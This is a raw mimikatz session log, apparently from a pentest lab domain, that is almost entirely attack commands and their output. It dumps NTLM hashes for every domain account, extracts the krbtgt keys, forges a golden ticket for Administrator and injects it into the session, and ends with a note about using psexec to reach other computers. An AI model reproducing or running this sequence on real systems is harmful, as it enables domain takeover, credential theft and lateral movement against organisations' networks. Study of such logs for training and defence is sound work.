```powershell
#mimikatz usage
PS C:\Users\Administrator\Desktop\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/


mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonPasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import

mimikatz # sekurlsa::msv /patch
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import

mimikatz # sekurlsa::logonPasswords /patch
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import

mimikatz # lsadump::lsa /inject /patch
Domain : TEST / S-1-5-21-2792811091-2429234815-3980700349

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : a87f3a337d73085c45f9416be5787d86

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 91d0e21af34edc8340c7bc7669f38590

RID  : 00000450 (1104)
User : fcasl
LM   :
NTLM : a87f3a337d73085c45f9416be5787d86

RID  : 00000451 (1105)
User : tstark
LM   :
NTLM : 19d73db73098ec342da07118b68465b3

RID  : 00000452 (1106)
User : pparker
LM   :
NTLM : a87f3a337d73085c45f9416be5787d86

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : a87f3a337d73085c45f9416be5787d86

RID  : 00000456 (1110)
User : asuka
LM   :
NTLM : a87f3a337d73085c45f9416be5787d86

RID  : 000003e8 (1000)
User : PENTEST-DC$
LM   :
NTLM : c3781efb2a00b2e85c98693704e144b9

RID  : 00000454 (1108)
User : ENT1$
LM   :
NTLM : 472acbf1122fac4cdb53fb2126dc5af4

RID  : 00000455 (1109)
User : ENT2$
LM   :
NTLM : 74c498273d3733baa85c8afcd2f31009

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : TEST / S-1-5-21-2792811091-2429234815-3980700349

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 91d0e21af34edc8340c7bc7669f38590
    LM   :
  Hash NTLM: 91d0e21af34edc8340c7bc7669f38590
    ntlm- 0: 91d0e21af34edc8340c7bc7669f38590
    lm  - 0: 304a792c1eaa1cd930c2fc59026539e3

 * WDigest
    01  9e17548b1dbd78583ad2534b3f72d73d
    02  a33f74810e21789972cce987b14ca9fa
    03  eae8abbd2fab2d1c5df770eed0879fd9
    04  9e17548b1dbd78583ad2534b3f72d73d
    05  a33f74810e21789972cce987b14ca9fa
    06  f874e086ab7c5a6ab28e276459bfad10
    07  9e17548b1dbd78583ad2534b3f72d73d
    08  c0f77ebe2f2b004833113df35e95ff89
    09  3e361ee941063e3f7ad8722bbb17641e
    10  d0de1a73d838e68c77fb05725a9f1f49
    11  5849c21e5b63353521c344610afd6ec1
    12  3e361ee941063e3f7ad8722bbb17641e
    13  30e2c36d6fc1138009eee6847664dfc3
    14  5849c21e5b63353521c344610afd6ec1
    15  beb304280a634db1563c8b4d4403a75b
    16  dc37107dfe2d7c276c5bfc4e08f54db1
    17  6674bf7c50729d0e9a168913adea6b46
    18  afa89d030621ad7700f8fd225c45c91c
    19  820681988f2ff9ab20d0e9eb8d45eee8
    20  2818b296886360b724b7bbfb31c795ae
    21  87626a425e64f305568ce8c938e60ed8
    22  87626a425e64f305568ce8c938e60ed8
    23  134c8a2bede78cb252c7f2d6da18ade0
    24  f6a1b164ec034e699866386873f64e01
    25  ff3539114c58a47b1510479e99008a92
    26  f9d1f34ffb7eda2d6afe6d2c18eb18bf
    27  37e3baa0433d15c8ebd4784d29ce9f88
    28  d2f9ad7e805772d26d66de0c357b1e6a
    29  fb56a69a97370485b0be2badcbc6123d

 * Kerberos
    Default Salt : TEST.LOCALkrbtgt
    Credentials
      des_cbc_md5       : d38aa8614945766e

 * Kerberos-Newer-Keys
    Default Salt : TEST.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1f7d1b3772971bee8cecb1dccacff2b843fdadb2b910a44991baaca1fa2f9981
      aes128_hmac       (4096) : b49bf3235edc7da3e0625fb07b65b5a8
      des_cbc_md5       (4096) : d38aa8614945766e

 * NTLM-Strong-NTOWF
    Random Value : 8c0872b645b7bae248d96419b82f46fa


mimikatz # kerberos::golden /User:Administrator /domain:test.local /sid:S-1-5-21-2792811091-2429234815-3980700349 /krbtgt:91d0e21af34edc8340c7bc7669f38590 /id:500 /ptt
User      : Administrator
Domain    : test.local (TEST)
SID       : S-1-5-21-2792811091-2429234815-3980700349
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 91d0e21af34edc8340c7bc7669f38590 - rc4_hmac_nt
Lifetime  : 10/18/2022 12:44:39 AM ; 10/15/2032 12:44:39 AM ; 10/15/2032 12:44:39 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ test.local' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6275A42F8

mimikatz #

and here run psexec to caccess \\OTHER_COMPUTERS with cmd.exe
```